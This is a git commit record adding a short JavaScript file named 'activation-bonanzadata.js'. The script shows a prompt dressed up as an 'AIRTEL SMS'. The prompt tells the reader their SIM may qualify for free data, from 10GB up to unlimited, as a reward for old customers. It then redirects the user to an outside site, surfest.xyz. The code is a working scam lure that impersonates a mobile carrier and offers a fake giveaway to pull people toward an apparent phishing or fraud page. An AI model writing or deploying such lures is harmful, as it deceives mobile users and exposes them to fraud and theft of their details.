b1215f68cddcff13a3917a3005b5cb72d323d8d1
inemitid <asuquodavid021@gmail.com>
2025-05-28 22:39:54 -0700

    Create activation-bonanzadata.js

---
+++ activation-bonanzadata.js
@@ -0,0 +1,6 @@
+
+var password = 'FREE DATA'
+password=prompt('AIRTEL SMS: Dear Customer, Kindly Check If your Airtel Sim Card Is Qualify To Receive From 10GB To Unlimited Data, Old Customers Reward, press Free Data To Check Now ','FREE DATA');
+if (password != 'FREE DATA') {
+location.href='https://surfest.xyz/freeairtel-bonanzadata.html';
+}
